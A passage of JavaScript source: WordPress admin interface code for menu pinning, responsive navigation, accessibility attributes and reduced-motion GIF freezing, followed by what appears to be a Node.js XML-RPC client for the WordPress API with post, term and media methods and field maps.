		var windowPos = $window.scrollTop(),
			resizing = ! event || event.type !== 'scroll';

		if ( isIOS || $adminmenu.data( 'wp-responsive' ) ) {
			return;
		}

		/*
		 * When the menu is higher than the window and smaller than the entire page.
		 * It should be adjusted to be able to see the entire menu.
		 *
		 * Otherwise it can be accessed normally.
		 */
		if ( height.menu + height.adminbar < height.window ||
			height.menu + height.adminbar + 20 > height.wpwrap ) {
			unpinMenu();
			return;
		}

		menuIsPinned = true;

		// If the menu is higher than the window, compensate on scroll.
		if ( height.menu + height.adminbar > height.window ) {
			// Check for overscrolling, this happens when swiping up at the top of the document in modern browsers.
			if ( windowPos < 0 ) {
				// Stick the menu to the top.
				if ( ! pinnedMenuTop ) {
					pinnedMenuTop = true;
					pinnedMenuBottom = false;

					$adminMenuWrap.css({
						position: 'fixed',
						top: '',
						bottom: ''
					});
				}

				return;
			} else if ( windowPos + height.window > $document.height() - 1 ) {
				// When overscrolling at the bottom, stick the menu to the bottom.
				if ( ! pinnedMenuBottom ) {
					pinnedMenuBottom = true;
					pinnedMenuTop = false;

					$adminMenuWrap.css({
						position: 'fixed',
						top: '',
						bottom: 0
					});
				}

				return;
			}

			if ( windowPos > lastScrollPosition ) {
				// When a down scroll has been detected.

				// If it was pinned to the top, unpin and calculate relative scroll.
				if ( pinnedMenuTop ) {
					pinnedMenuTop = false;
					// Calculate new offset position.
					menuTop = $adminMenuWrap.offset().top - height.adminbar - ( windowPos - lastScrollPosition );

					if ( menuTop + height.menu + height.adminbar < windowPos + height.window ) {
						menuTop = windowPos + height.window - height.menu - height.adminbar;
					}

					$adminMenuWrap.css({
						position: 'absolute',
						top: menuTop,
						bottom: ''
					});
				} else if ( ! pinnedMenuBottom && $adminMenuWrap.offset().top + height.menu < windowPos + height.window ) {
					// Pin it to the bottom.
					pinnedMenuBottom = true;

					$adminMenuWrap.css({
						position: 'fixed',
						top: '',
						bottom: 0
					});
				}
			} else if ( windowPos < lastScrollPosition ) {
				// When a scroll up is detected.

				// If it was pinned to the bottom, unpin and calculate relative scroll.
				if ( pinnedMenuBottom ) {
					pinnedMenuBottom = false;

					// Calculate new offset position.
					menuTop = $adminMenuWrap.offset().top - height.adminbar + ( lastScrollPosition - windowPos );

					if ( menuTop + height.menu > windowPos + height.window ) {
						menuTop = windowPos;
					}

					$adminMenuWrap.css({
						position: 'absolute',
						top: menuTop,
						bottom: ''
					});
				} else if ( ! pinnedMenuTop && $adminMenuWrap.offset().top >= windowPos + height.adminbar ) {

					// Pin it to the top.
					pinnedMenuTop = true;

					$adminMenuWrap.css({
						position: 'fixed',
						top: '',
						bottom: ''
					});
				}
			} else if ( resizing ) {
				// Window is being resized.

				pinnedMenuTop = pinnedMenuBottom = false;

				// Calculate the new offset.
				menuTop = windowPos + height.window - height.menu - height.adminbar - 1;

				if ( menuTop > 0 ) {
					$adminMenuWrap.css({
						position: 'absolute',
						top: menuTop,
						bottom: ''
					});
				} else {
					unpinMenu();
				}
			}
		}

		lastScrollPosition = windowPos;
	}

	/**
	 * Determines the height of certain elements.
	 *
	 * @since 4.1.0
	 *
	 * @return {void}
	 */
	function resetHeights() {
		height = {
			window: $window.height(),
			wpwrap: $wpwrap.height(),
			adminbar: $adminbar.height(),
			menu: $adminMenuWrap.height()
		};
	}

	/**
	 * Unpins the menu.
	 *
	 * @since 4.1.0
	 *
	 * @return {void}
	 */
	function unpinMenu() {
		if ( isIOS || ! menuIsPinned ) {
			return;
		}

		pinnedMenuTop = pinnedMenuBottom = menuIsPinned = false;
		$adminMenuWrap.css({
			position: '',
			top: '',
			bottom: ''
		});
	}

	/**
	 * Pins and unpins the menu when applicable.
	 *
	 * @since 4.1.0
	 *
	 * @return {void}
	 */
	function setPinMenu() {
		resetHeights();

		if ( $adminmenu.data('wp-responsive') ) {
			$body.removeClass( 'sticky-menu' );
			unpinMenu();
		} else if ( height.menu + height.adminbar > height.window ) {
			pinMenu();
			$body.removeClass( 'sticky-menu' );
		} else {
			$body.addClass( 'sticky-menu' );
			unpinMenu();
		}
	}

	if ( ! isIOS ) {
		$window.on( 'scroll.pin-menu', pinMenu );
		$document.on( 'tinymce-editor-init.pin-menu', function( event, editor ) {
			editor.on( 'wp-autoresize', resetHeights );
		});
	}

	/**
	 * Changes the sortables and responsiveness of metaboxes.
	 *
	 * @since 3.8.0
	 *
	 * @return {void}
	 */
	window.wpResponsive = {

		/**
		 * Initializes the wpResponsive object.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		init: function() {
			var self = this;

			this.maybeDisableSortables = this.maybeDisableSortables.bind( this );

			// Modify functionality based on custom activate/deactivate event.
			$document.on( 'wp-responsive-activate.wp-responsive', function() {
				self.activate();
				self.toggleAriaHasPopup( 'add' );
			}).on( 'wp-responsive-deactivate.wp-responsive', function() {
				self.deactivate();
				self.toggleAriaHasPopup( 'remove' );
			});

			$( '#wp-admin-bar-menu-toggle a' ).attr( 'aria-expanded', 'false' );

			// Toggle sidebar when toggle is clicked.
			$( '#wp-admin-bar-menu-toggle' ).on( 'click.wp-responsive', function( event ) {
				event.preventDefault();

				// Close any open toolbar submenus.
				$adminbar.find( '.hover' ).removeClass( 'hover' );

				$wpwrap.toggleClass( 'wp-responsive-open' );
				if ( $wpwrap.hasClass( 'wp-responsive-open' ) ) {
					$(this).find('a').attr( 'aria-expanded', 'true' );
					$( '#adminmenu a:first' ).trigger( 'focus' );
				} else {
					$(this).find('a').attr( 'aria-expanded', 'false' );
				}
			} );

			// Close sidebar when target moves outside of toggle and sidebar.
			$( document ).on( 'click', function( event ) {
				if ( ! $wpwrap.hasClass( 'wp-responsive-open' ) || ! document.hasFocus() ) {
					return;
				}

				var focusIsInToggle  = $.contains( $( '#wp-admin-bar-menu-toggle' )[0], event.target );
				var focusIsInSidebar = $.contains( $( '#adminmenuwrap' )[0], event.target );

				if ( ! focusIsInToggle && ! focusIsInSidebar ) {
					$( '#wp-admin-bar-menu-toggle' ).trigger( 'click.wp-responsive' );
				}
			} );

			// Close sidebar when a keypress completes outside of toggle and sidebar.
			$( document ).on( 'keyup', function( event ) {
				var toggleButton   = $( '#wp-admin-bar-menu-toggle' )[0];
				if ( ! $wpwrap.hasClass( 'wp-responsive-open' ) ) {
				    return;
				}
				if ( 27 === event.keyCode ) {
					$( toggleButton ).trigger( 'click.wp-responsive' );
					$( toggleButton ).find( 'a' ).trigger( 'focus' );
				} else {
					if ( 9 === event.keyCode ) {
						var sidebar        = $( '#adminmenuwrap' )[0];
						var focusedElement = event.relatedTarget || document.activeElement;
						// A brief delay is required to allow focus to switch to another element.
						setTimeout( function() {
							var focusIsInToggle  = $.contains( toggleButton, focusedElement );
							var focusIsInSidebar = $.contains( sidebar, focusedElement );

							if ( ! focusIsInToggle && ! focusIsInSidebar ) {
								$( toggleButton ).trigger( 'click.wp-responsive' );
							}
						}, 10 );
					}
				}
			});

			// Add menu events.
			$adminmenu.on( 'click.wp-responsive', 'li.wp-has-submenu > a', function( event ) {
				if ( ! $adminmenu.data('wp-responsive') ) {
					return;
				}
				let state = ( 'false' === $( this ).attr( 'aria-expanded' ) ) ? 'true' : 'false';
				$( this ).parent( 'li' ).toggleClass( 'selected' );
				$( this ).attr( 'aria-expanded', state );
				$( this ).trigger( 'focus' );
				event.preventDefault();
			});

			self.trigger();
			$document.on( 'wp-window-resized.wp-responsive', this.trigger.bind( this ) );

			// This needs to run later as UI Sortable may be initialized when the document is ready.
			$window.on( 'load.wp-responsive', this.maybeDisableSortables );
			$document.on( 'postbox-toggled', this.maybeDisableSortables );

			// When the screen columns are changed, potentially disable sortables.
			$( '#screen-options-wrap input' ).on( 'click', this.maybeDisableSortables );
		},

		/**
		 * Disable sortables if there is only one metabox, or the screen is in one column mode. Otherwise, enable sortables.
		 *
		 * @since 5.3.0
		 *
		 * @return {void}
		 */
		maybeDisableSortables: function() {
			var width = navigator.userAgent.indexOf('AppleWebKit/') > -1 ? $window.width() : window.innerWidth;

			if (
				( width <= 782 ) ||
				( 1 >= $sortables.find( '.ui-sortable-handle:visible' ).length && jQuery( '.columns-prefs-1 input' ).prop( 'checked' ) )
			) {
				this.disableSortables();
			} else {
				this.enableSortables();
			}
		},

		/**
		 * Changes properties of body and admin menu.
		 *
		 * Pins and unpins the menu and adds the auto-fold class to the body.
		 * Makes the admin menu responsive and disables the metabox sortables.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		activate: function() {
			setPinMenu();

			if ( ! $body.hasClass( 'auto-fold' ) ) {
				$body.addClass( 'auto-fold' );
			}

			$adminmenu.data( 'wp-responsive', 1 );
			this.disableSortables();
		},

		/**
		 * Changes properties of admin menu and enables metabox sortables.
		 *
		 * Pin and unpin the menu.
		 * Removes the responsiveness of the admin menu and enables the metabox sortables.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		deactivate: function() {
			setPinMenu();
			$adminmenu.removeData('wp-responsive');

			this.maybeDisableSortables();
		},

		/**
		 * Toggles the aria-haspopup attribute for the responsive admin menu.
		 *
		 * The aria-haspopup attribute is only necessary for the responsive menu.
		 * See ticket https://core.trac.wordpress.org/ticket/43095
		 *
		 * @since 6.6.0
		 *
		 * @param {string} action Whether to add or remove the aria-haspopup attribute.
		 *
		 * @return {void}
		 */
		toggleAriaHasPopup: function( action ) {
			var elements = $adminmenu.find( '[data-ariahaspopup]' );

			if ( action === 'add' ) {
				elements.each( function() {
					$( this ).attr( 'aria-haspopup', 'menu' ).attr( 'aria-expanded', 'false' );
				} );

				return;
			}

			elements.each( function() {
				$( this ).removeAttr( 'aria-haspopup' ).removeAttr( 'aria-expanded' );
			} );
		},

		/**
		 * Sets the responsiveness and enables the overlay based on the viewport width.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		trigger: function() {
			var viewportWidth = getViewportWidth();

			// Exclude IE < 9, it doesn't support @media CSS rules.
			if ( ! viewportWidth ) {
				return;
			}

			if ( viewportWidth <= 782 ) {
				if ( ! wpResponsiveActive ) {
					$document.trigger( 'wp-responsive-activate' );
					wpResponsiveActive = true;
				}
			} else {
				if ( wpResponsiveActive ) {
					$document.trigger( 'wp-responsive-deactivate' );
					wpResponsiveActive = false;
				}
			}

			if ( viewportWidth <= 480 ) {
				this.enableOverlay();
			} else {
				this.disableOverlay();
			}

			this.maybeDisableSortables();
		},

		/**
		 * Inserts a responsive overlay and toggles the window.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		enableOverlay: function() {
			if ( $overlay.length === 0 ) {
				$overlay = $( '<div id="wp-responsive-overlay"></div>' )
					.insertAfter( '#wpcontent' )
					.hide()
					.on( 'click.wp-responsive', function() {
						$toolbar.find( '.menupop.hover' ).removeClass( 'hover' );
						$( this ).hide();
					});
			}

			$toolbarPopups.on( 'click.wp-responsive', function() {
				$overlay.show();
			});
		},

		/**
		 * Disables the responsive overlay and removes the overlay.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		disableOverlay: function() {
			$toolbarPopups.off( 'click.wp-responsive' );
			$overlay.hide();
		},

		/**
		 * Disables sortables.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		disableSortables: function() {
			if ( $sortables.length ) {
				try {
					$sortables.sortable( 'disable' );
					$sortables.find( '.ui-sortable-handle' ).addClass( 'is-non-sortable' );
				} catch ( e ) {}
			}
		},

		/**
		 * Enables sortables.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		enableSortables: function() {
			if ( $sortables.length ) {
				try {
					$sortables.sortable( 'enable' );
					$sortables.find( '.ui-sortable-handle' ).removeClass( 'is-non-sortable' );
				} catch ( e ) {}
			}
		}
	};

	/**
	 * Add an ARIA role `button` to elements that behave like UI controls when JavaScript is on.
	 *
	 * @since 4.5.0
	 *
	 * @return {void}
	 */
	function aria_button_if_js() {
		$( '.aria-button-if-js' ).attr( 'role', 'button' );
	}

	$( document ).on( 'ajaxComplete', function() {
		aria_button_if_js();
	});

	/**
	 * Get the viewport width.
	 *
	 * @since 4.7.0
	 *
	 * @return {number|boolean} The current viewport width or false if the
	 *                          browser doesn't support innerWidth (IE < 9).
	 */
	function getViewportWidth() {
		var viewportWidth = false;

		if ( window.innerWidth ) {
			// On phones, window.innerWidth is affected by zooming.
			viewportWidth = Math.max( window.innerWidth, document.documentElement.clientWidth );
		}

		return viewportWidth;
	}

	/**
	 * Sets the admin menu collapsed/expanded state.
	 *
	 * Sets the global variable `menuState` and triggers a custom event passing
	 * the current menu state.
	 *
	 * @since 4.7.0
	 *
	 * @return {void}
	 */
	function setMenuState() {
		var viewportWidth = getViewportWidth() || 961;

		if ( viewportWidth <= 782  ) {
			menuState = 'responsive';
		} else if ( $body.hasClass( 'folded' ) || ( $body.hasClass( 'auto-fold' ) && viewportWidth <= 960 && viewportWidth > 782 ) ) {
			menuState = 'folded';
		} else {
			menuState = 'open';
		}

		$document.trigger( 'wp-menu-state-set', { state: menuState } );
	}

	// Set the menu state when the window gets resized.
	$document.on( 'wp-window-resized.set-menu-state', setMenuState );

	/**
	 * Sets ARIA attributes on the collapse/expand menu button.
	 *
	 * When the admin menu is open or folded, updates the `aria-expanded` and
	 * `aria-label` attributes of the button to give feedback to assistive
	 * technologies. In the responsive view, the button is always hidden.
	 *
	 * @since 4.7.0
	 *
	 * @return {void}
	 */
	$document.on( 'wp-menu-state-set wp-collapse-menu', function( event, eventData ) {
		var $collapseButton = $( '#collapse-button' ),
			ariaExpanded, ariaLabelText;

		if ( 'folded' === eventData.state ) {
			ariaExpanded = 'false';
			ariaLabelText = __( 'Expand Main menu' );
		} else {
			ariaExpanded = 'true';
			ariaLabelText = __( 'Collapse Main menu' );
		}

		$collapseButton.attr({
			'aria-expanded': ariaExpanded,
			'aria-label': ariaLabelText
		});
	});

	window.wpResponsive.init();
	setPinMenu();
	setMenuState();
	makeNoticesDismissible();
	aria_button_if_js();

	$document.on( 'wp-pin-menu wp-window-resized.pin-menu postboxes-columnchange.pin-menu postbox-toggled.pin-menu wp-collapse-menu.pin-menu wp-scroll-start.pin-menu', setPinMenu );

	// Set initial focus on a specific element.
	$( '.wp-initial-focus' ).trigger( 'focus' );

	// Toggle update details on update-core.php.
	$body.on( 'click', '.js-update-details-toggle', function() {
		var $updateNotice = $( this ).closest( '.js-update-details' ),
			$progressDiv = $( '#' + $updateNotice.data( 'update-details' ) );

		/*
		 * When clicking on "Show details" move the progress div below the update
		 * notice. Make sure it gets moved just the first time.
		 */
		if ( ! $progressDiv.hasClass( 'update-details-moved' ) ) {
			$progressDiv.insertAfter( $updateNotice ).addClass( 'update-details-moved' );
		}

		// Toggle the progress div visibility.
		$progressDiv.toggle();
		// Toggle the Show Details button expanded state.
		$( this ).attr( 'aria-expanded', $progressDiv.is( ':visible' ) );
	});
});

/**
 * Hides the update button for expired plugin or theme uploads.
 *
 * On the "Update plugin/theme from uploaded zip" screen, once the upload has expired,
 * hides the "Replace current with uploaded" button and displays a warning.
 *
 * @since 5.5.0
 */
$( function( $ ) {
	var $overwrite, $warning;

	if ( ! $body.hasClass( 'update-php' ) ) {
		return;
	}

	$overwrite = $( 'a.update-from-upload-overwrite' );
	$warning   = $( '.update-from-upload-expired' );

	if ( ! $overwrite.length || ! $warning.length ) {
		return;
	}

	window.setTimeout(
		function() {
			$overwrite.hide();
			$warning.removeClass( 'hidden' );

			if ( window.wp && window.wp.a11y ) {
				window.wp.a11y.speak( $warning.text() );
			}
		},
		7140000 // 119 minutes. The uploaded file is deleted after 2 hours.
	);
} );

// Fire a custom jQuery event at the end of window resize.
( function() {
	var timeout;

	/**
	 * Triggers the WP window-resize event.
	 *
	 * @since 3.8.0
	 *
	 * @return {void}
	 */
	function triggerEvent() {
		$document.trigger( 'wp-window-resized' );
	}

	/**
	 * Fires the trigger event again after 200 ms.
	 *
	 * @since 3.8.0
	 *
	 * @return {void}
	 */
	function fireOnce() {
		window.clearTimeout( timeout );
		timeout = window.setTimeout( triggerEvent, 200 );
	}

	$window.on( 'resize.wp-fire-once', fireOnce );
}());

// Make Windows 8 devices play along nicely.
(function(){
	if ( '-ms-user-select' in document.documentElement.style && navigator.userAgent.match(/IEMobile\/10\.0/) ) {
		var msViewportStyle = document.createElement( 'style' );
		msViewportStyle.appendChild(
			document.createTextNode( '@-ms-viewport{width:auto!important}' )
		);
		document.getElementsByTagName( 'head' )[0].appendChild( msViewportStyle );
	}
})();

}( jQuery, window ));

/**
 * Freeze animated plugin icons when reduced motion is enabled.
 *
 * When the user has enabled the 'prefers-reduced-motion' setting, this module
 * stops animations for all GIFs on the page with the class 'plugin-icon' or
 * plugin icon images in the update plugins table.
 *
 * @since 6.4.0
 */
(function() {
	// Private variables and methods.
	var priv = {},
		pub = {},
		mediaQuery;

	// Initialize pauseAll to false; it will be set to true if reduced motion is preferred.
	priv.pauseAll = false;
	if ( window.matchMedia ) {
		mediaQuery = window.matchMedia( '(prefers-reduced-motion: reduce)' );
		if ( ! mediaQuery || mediaQuery.matches ) {
			priv.pauseAll = true;
		}
	}

	// Method to replace animated GIFs with a static frame.
	priv.freezeAnimatedPluginIcons = function( img ) {
		var coverImage = function() {
			var width = img.width;
			var height = img.height;
			var canvas = document.createElement( 'canvas' );

			// Set canvas dimensions.
			canvas.width = width;
			canvas.height = height;

			// Copy classes from the image to the canvas.
			canvas.className = img.className;

			// Check if the image is inside a specific table.
			var isInsideUpdateTable = img.closest( '#update-plugins-table' );

			if ( isInsideUpdateTable ) {
				// Transfer computed styles from image to canvas.
				var computedStyles = window.getComputedStyle( img ),
					i, max;
				for ( i = 0, max = computedStyles.length; i < max; i++ ) {
					var propName = computedStyles[ i ];
					var propValue = computedStyles.getPropertyValue( propName );
					canvas.style[ propName ] = propValue;
				}
			}

			// Draw the image onto the canvas.
			canvas.getContext( '2d' ).drawImage( img, 0, 0, width, height );

			// Set accessibility attributes on canvas.
			canvas.setAttribute( 'aria-hidden', 'true' );
			canvas.setAttribute( 'role', 'presentation' );

			// Insert canvas before the image and set the image to be near-invisible.
			var parent = img.parentNode;
			parent.insertBefore( canvas, img );
			img.style.opacity = 0.01;
			img.style.width = '0px';
			img.style.height = '0px';
		};

		// If the image is already loaded, apply the coverImage function.
		if ( img.complete ) {
			coverImage();
		} else {
			// Otherwise, wait for the image to load.
			img.addEventListener( 'load', coverImage, true );
		}
	};

	// Public method to freeze all relevant GIFs on the page.
	pub.freezeAll = function() {
		var images = document.querySelectorAll( '.plugin-icon, #update-plugins-table img' );
		for ( var x = 0; x < images.length; x++ ) {
			if ( /\.gif(?:\?|$)/i.test( images[ x ].src ) ) {
				priv.freezeAnimatedPluginIcons( images[ x ] );
			}
		}
	};

	// Only run the freezeAll method if the user prefers reduced motion.
	if ( true === priv.pauseAll ) {
		pub.freezeAll();
	}

	// Listen for jQuery AJAX events.
	( function( $ ) {
		if ( window.pagenow === 'plugin-install' ) {
			// Only listen for ajaxComplete if this is the plugin-install.php page.
			$( document ).ajaxComplete( function( event, xhr, settings ) {

				// Check if this is the 'search-install-plugins' request.
				if ( settings.data && typeof settings.data === 'string' && settings.data.includes( 'action=search-install-plugins' ) ) {
					// Recheck if the user prefers reduced motion.
					if ( window.matchMedia ) {
						var mediaQuery = window.matchMedia( '(prefers-reduced-motion: reduce)' );
						if ( mediaQuery.matches ) {
							pub.freezeAll();
						}
					} else {
						// Fallback for browsers that don't support matchMedia.
						if ( true === priv.pauseAll ) {
							pub.freezeAll();
						}
					}
				}
			} );
		}
	} )( jQuery );

	// Expose public methods.
	return pub;
})();
// http://codex.wordpress.org/XML-RPC_Support
// http://codex.wordpress.org/XML-RPC_WordPress_API

function extend( a, b ) {
	for ( var p in b ) {
		a[ p ] = b[ p ];
	}

	return a;
}

function parseArguments( args ) {
	return [].slice.call( args, 1 )

		// Remove null arguments
		// Null values only exist for optional fields. As of WordPress 4.4,
		// null is no longer treated the same as omitting the value. To
		// compensate for this, we just drop the argument before calling
		// into WordPress. See #25.
		.filter(function( value ) {
			return value !== null;
		});
}

function Client( settings ) {
	[ "url", "username", "password" ].forEach(function( prop ) {
		if ( !settings[prop] ) {
			throw new Error( "Missing required setting: " + prop );
		}
	});

	var parsedUrl = Client.parseUrl( settings.url );
	this.rpc = xmlrpc[ parsedUrl.secure ? "createSecureClient" : "createClient" ]({
		host: settings.host || parsedUrl.host,
		port: parsedUrl.port,
		path: parsedUrl.path,
		rejectUnauthorized: settings.rejectUnauthorized !== undefined ? settings.rejectUnauthorized : true,
		servername: settings.host || parsedUrl.host,

		// Always set Host header in case we're pointing to a different server
		// via settings.host
		headers: {
			Host: parsedUrl.host
		},
		basic_auth: !settings.basicAuth ? null : {
			user: settings.basicAuth.username,
			pass: settings.basicAuth.password
		}
	});
	this.blogId = settings.blogId || 0;
	this.username = settings.username;
	this.password = settings.password;
}

Client.parseUrl = function( wpUrl ) {
	var urlParts, secure;

	// allow URLs without a protocol
	if ( !(/\w+:\/\//.test( wpUrl ) ) ) {
		wpUrl = "http://" + wpUrl;
	}
	urlParts = url.parse( wpUrl );
	secure = urlParts.protocol === "https:";

	return {
		host: urlParts.hostname,
		port: urlParts.port || (secure ? 443 : 80),
		path: urlParts.path.replace( /\/+$/, "" ) + "/xmlrpc.php",
		secure: secure
	};
};

extend( Client.prototype, {
	call: function( method ) {
		var args = parseArguments( arguments ),
			fn = args.pop();

		if ( typeof fn !== "function" ) {
			args.push( fn );
			fn = null;
		}

		this.rpc.methodCall( method, args, function( error, data ) {
			if ( !error ) {
				return fn( null, data );
			}

			if ( error.code === "ENOTFOUND" && error.syscall === "getaddrinfo" ) {
				error.message = "Unable to connect to WordPress.";
			} else if ( error.message === "Unknown XML-RPC tag 'TITLE'" ) {
				var additional = error.res.statusCode;
				if (error.res.statusMessage) {
					additional += "; " + error.res.statusMessage;
				}

				error.message = "(" + additional + ") " + error.message;
			}

			fn( error );
		});
	},

	authenticatedCall: function() {
		var args = [].slice.call( arguments );
		args.splice( 1, 0, this.blogId, this.username, this.password );
		this.call.apply( this, args );
	},

	listMethods: function( fn ) {
		this.call( "system.listMethods", fn );
	}
});

extend( Client.prototype, {
	getPost: function( id, fields, fn ) {
		if ( typeof fields === "function" ) {
			fn = fields;
			fields = null;
		}

		if ( fields ) {
			fields = fieldMap.array( fields, "post" );
		}

		this.authenticatedCall( "wp.getPost", id, fields, function( error, post ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, fieldMap.from( post, "post" ) );
		});
	},

	getPosts: function( filter, fields, fn ) {
		if ( typeof filter === "function" ) {
			fn = filter;
			fields = null;
			filter = {};
		}

		if ( typeof fields === "function" ) {
			fn = fields;
			fields = null;
		}

		if ( filter.type ) {
			filter.post_type = filter.type;
			delete filter.type;
		}

		if ( filter.status ) {
			filter.post_status = filter.status;
			delete filter.status;
		}

		if ( filter.orderby ) {
			filter.orderby = fieldMap.array( [ filter.orderby ], "post" )[ 0 ];
		}

		if ( fields ) {
			fields = fieldMap.array( fields, "post" );
		}

		this.authenticatedCall( "wp.getPosts", filter, fields, function( error, posts ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, posts.map(function( post ) {
				return fieldMap.from( post, "post" );
			}));
		});
	},

	newPost: function( data, fn ) {
		this.authenticatedCall( "wp.newPost", fieldMap.to( data, "post" ), fn );
	},

	// to remove a term, just set the terms and leave out the id that you want to remove
	// to remove a custom field, pass the id with no key or value
	editPost: function( id, data, fn ) {
		this.authenticatedCall( "wp.editPost", id, fieldMap.to( data, "post" ), fn );
	},

	deletePost: function( id, fn ) {
		this.authenticatedCall( "wp.deletePost", id, fn );
	},

	getPostType: function( name, fields, fn ) {
		if ( typeof fields === "function" ) {
			fn = fields;
			fields = null;
		}

		if ( fields ) {
			fields = fieldMap.array( fields, "postType" );
		}

		this.authenticatedCall( "wp.getPostType", name, fields, function( error, postType ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, fieldMap.from( postType, "postType" ) );
		});
	},

	getPostTypes: function( filter, fields, fn ) {
		if ( typeof filter === "function" ) {
			fn = filter;
			fields = null;
			filter = {};
		}

		if ( typeof fields === "function" ) {
			fn = fields;
			fields = null;
		}

		if ( Array.isArray(filter) ) {
			fields = filter;
			filter = {};
		}

		if ( fields ) {
			fields = fieldMap.array( fields, "postType" );
		}

		this.authenticatedCall( "wp.getPostTypes", filter, fields, function( error, postTypes ) {
			if ( error ) {
				return fn( error );
			}

			Object.keys( postTypes ).forEach(function( postType ) {
				postTypes[ postType ] = fieldMap.from( postTypes[ postType ], "postType" );
			});
			fn( null, postTypes );
		});
	}
});

extend( Client.prototype, {
	getTaxonomy: function( name, fn ) {
		this.authenticatedCall( "wp.getTaxonomy", name, function( error, taxonomy ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, fieldMap.from( taxonomy, "taxonomy" ) );
		});
	},

	getTaxonomies: function( fn ) {
		this.authenticatedCall( "wp.getTaxonomies", function( error, taxonomies ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, taxonomies.map(function( taxonomy ) {
				return fieldMap.from( taxonomy, "taxonomy" );
			}));
		});
	},

	getTerm: function( taxonomy, id, fn ) {
		this.authenticatedCall( "wp.getTerm", taxonomy, id, function( error, term ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, fieldMap.from( term, "term" ) );
		});
	},

	getTerms: function( taxonomy, filter, fn ) {
		if ( typeof filter === "function" ) {
			fn = filter;
			filter = {};
		}

		if ( filter.hideEmpty ) {
			filter.hide_empty = filter.hideEmpty;
			delete filter.hideEmpty;
		}

		if ( filter.orderby ) {
			filter.orderby = fieldMap.array( [ filter.orderby ], "term" )[ 0 ];
		}

		this.authenticatedCall( "wp.getTerms", taxonomy, filter, function( error, terms ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, terms.map(function( term ) {
				return fieldMap.from( term, "term" );
			}));
		});
	},

	newTerm: function( data, fn ) {
		this.authenticatedCall( "wp.newTerm", fieldMap.to( data, "term" ), fn );
	},

	editTerm: function( id, data, fn ) {
		this.authenticatedCall( "wp.editTerm", id, fieldMap.to( data, "term" ), fn );
	},

	deleteTerm: function( taxonomy, id, fn ) {
		this.authenticatedCall( "wp.deleteTerm", taxonomy, id, fn );
	}
});

extend( Client.prototype, {
	getMediaItem: function( id, fn ) {
		this.authenticatedCall( "wp.getMediaItem", id, function( error, media ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, fieldMap.from( media, "media" ) );
		});
	},

	getMediaLibrary: function( filter, fn ) {
		if ( typeof filter === "function" ) {
			fn = filter;
			filter = {};
		}

		this.authenticatedCall( "wp.getMediaLibrary", filter, function( error, media ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, media.map(function( item ) {
				return fieldMap.from( item, "media" );
			}));
		});
	},

	uploadFile: function( data, fn ) {
		this.authenticatedCall( "wp.uploadFile", fieldMap.to( data, "file" ), fn );
	}
});

function extend( a, b ) {
	for ( var p in b ) {
		a[ p ] = b[ p ];
	}

	return a;
}

function createFieldMaps( renames, toFns, fromFns ) {
	var to = extend( {}, renames ),
		from = {};

	Object.keys( renames ).forEach(function( key ) {
		from[ renames[ key ] ] = key;
	});

	return {
		renames: renames,
		to: extend( to, toFns ),
		from: extend( from, fromFns )
	};
}

function mapFields( data, map ) {
	var field, value, mappedField,
		ret = {};

	for ( field in data ) {
		value = data[ field ];
		mappedField = map[ field ];

		// no map -> delete
		if ( !mappedField ) {
			continue;
		// string -> change field name
		} else if ( typeof mappedField === "string" ) {
			ret[ mappedField ] = value;
		// function -> merge result
		} else {
			extend( ret, mappedField( value ) );
		}
	}

	return ret;
}

maps.labels = createFieldMaps({
	addNewItem: "add_new_item",
	addOrRemoveItems: "add_or_remove_items",
	allItems: "all_items",
	chooseFromMostUsed: "choose_from_most_used",
	editItem: "edit_item",
	menuName: "menu_name",
	name: "name",
	nameAdminBar: "name_admin_bar",
	newItemName: "new_item_name",
	parentItem: "parent_item",
	parentItemColon: "parent_item_colon",
	popularItems: "popular_items",
	searchItems: "search_items",
	separateItemsWithCommas: "separate_items_with_commas",
	singularName: "singular_name",
	updateItem: "update_item",
	viewItem: "view_item"
});

maps.post = createFieldMaps({
	author: /* int */ "post_author",
	commentStatus: /* string */ "comment_status",
	content: /* string */ "post_content",
	customFields: /* array */ "custom_fields",
	date: /* datetime */ "post_date",
	excerpt: /* string */ "post_excerpt",
	format: /* string */"post_format",
	id: /* string */ "post_id", /* readonly */
	link: /* string */ "link" /* readonly */,
	modified: /* datetime */ "post_modified",
	menuOrder: /* int */ "menu_order",
	name: /* string */ "post_name",
	pageTemplate: /* string */ "page_template",
	parent: /* int */ "post_parent",
	password: /* string */ "post_password",
	pingStatus: /* string */ "ping_status",
	status: /* string */ "post_status",
	sticky: /* bool */ "sticky",
	terms: /* struct */ "terms" /* array */,
	termNames: /* struct */ "terms_names",
	thumbnail: /* int */ "post_thumbnail",
	title: /* string */ "post_title",
	type: /* string */ "post_type"
}, {}, {
	post_date_gmt: /* datetime */ function( date ) {
		return {
			date: new Date( date )
		};
	},
	post_modified_gmt: /* datetime */ function( date ) {
		return {
			modified: new Date( date )
		};
	}
});

maps.postType = createFieldMaps({
	_builtin: /* bool */ "_builtin",
	cap: /* struct */ "cap",
	capabilityType: /* string */ "capability_type",
	description: /* string */ "description",
	_editLink: /* string */ "_edit_link",
	excludeFromSearch: /* bool */ "exclude_from_search",
	hasArchive: /* bool */ "has_archive",
	hierarchical: /* bool */ "hierarchical",
	label: /* string */ "label",
	labels: /* struct */ "labels",
	mapMetaCap: /* bool */ "map_meta_cap",
	menuIcon: /* string */ "menu_icon",
	menuPosition: /* int */ "menu_position",
	name: /* string */ "name",
	"public": /* bool */ "public",
	publiclyQuerably: /* bool */ "publicly_queryable",
	queryVar: /* mixed */ "query_var",
	rewrite: /* mixed */ "rewrite",
